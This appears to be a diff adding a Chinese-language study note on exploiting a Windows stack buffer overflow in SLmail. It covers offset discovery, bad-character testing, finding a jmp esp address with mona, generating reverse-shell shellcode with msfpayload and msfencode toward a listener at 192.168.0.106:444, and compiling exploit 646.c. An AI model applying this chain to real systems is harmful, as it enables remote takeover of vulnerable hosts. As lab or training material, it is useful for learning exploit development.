@@ -1,0 +1,56 @@
+一.win溢出
+查找溢出位置方法
+1.二分法
+2.唯一字符串法
+字典/usr/share/metasploit-framework/tools/exploit
+./pattern_create.rb 2700     //生成2700字符的唯一字符串
+./pattern_offset.rb -q 39694438 //计算偏移量
+0242A158----0242A304 (calc)计算的1Ac==428 (10进制)
+
+不能正常使用(失败)
+\x01-\x7f是成功的
+之后都是输出\xc1 \x80 \xc1 \x81
+然后只到\xbf 之后的就没有输出
+\x0a不能用
+可能我使用的是64位windows
+32位的响应能简单
+
+找到一块固定不变的地址
+eip中写入固定模块中jmp esp指令地址
+使用immunity debuger
+选SLmail
+输入!mona modules
+找到rebase因为是重启地址不变
+前四列false最后是true
+找到一个openc32.dll
+需要找到jmp esp的机器代码
+
+kali当中
+汇编指令转化为二进制/usr/share/metasploit-framework/tools  ./nasm_shell.rb
+nasm > jmp esp
+00000000     FFE4     jmp esp
+
+!mona find -s "\xff\xe4" -m openc32.dll
+!mona find -s "\xff\xe4" -m mfc42lc.dll
+!mona find -s "\xff\xe4" -m slmfc.dll
+找到后双击
+
+右键选disassemble编程汇编
+内存中反转放置内容
+
+生成shellcode
+/usr/share/framework2/payloads中
+win32_reverse用于反向shell
+./msfpayloads win32_reverse LHOST=192.168.0.106 LPORT=444 C | grep 0d
+发现匹配成功有坏字符\x0d
+./msfpayloads win32_reverse LHOST=192.168.0.106 LPORT=444 R | ./msfencode -b "\x00\x0a\x0d"
+然后写入脚本当中
+
+修改注册表可以实现图形化远程登陆
+
+二.linux溢出
+
+三.linux中调用windows库(运行.exe)
+apt-get install mingwin32
+dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe
